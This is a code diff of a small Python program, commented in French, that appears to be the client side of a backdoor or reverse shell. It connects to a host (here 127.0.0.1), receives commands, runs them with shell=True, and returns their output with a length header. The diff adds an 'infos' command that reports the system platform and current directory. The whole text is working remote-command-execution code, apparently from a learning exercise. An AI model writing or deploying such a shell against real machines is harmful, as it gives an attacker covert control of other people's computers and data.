@@ -1,6 +1,8 @@
 import socket
 import time
 import subprocess
+import platform
+import os
 
 
 HOST_IP = "127.0.0.1"
@@ -29,29 +31,22 @@ while True:
 
     print("Commande : ", commande)
 
-    resultat = subprocess.run(
-        commande, shell=True, capture_output=True, universal_newlines=True
-    )  # dir sur PC
+    if commande == "infos":
+        reponse = platform.platform() + " " + os.getcwd()
+    else:
+        resultat = subprocess.run(
+            commande, shell=True, capture_output=True, universal_newlines=True
+        )  # dir sur PC
 
-    reponse = resultat.stdout + resultat.stderr
+        reponse = resultat.stdout + resultat.stderr
 
-    if not reponse or len(reponse) == 0:
-        reponse = " "
-
-    # HEADER 13 octets -> longueur data
-    # DATA (longeur) octets
-
-    # HEADER 000000003173
-
-    # 10000000000000 13 octets
+        if not reponse or len(reponse) == 0:
+            reponse = " "
 
     header = str(len(reponse)).zfill(13)
-
     print("header:", header)
 
     s.sendall(header.encode())
     s.sendall(reponse.encode())
-
-    # handshake
 
 s.close()
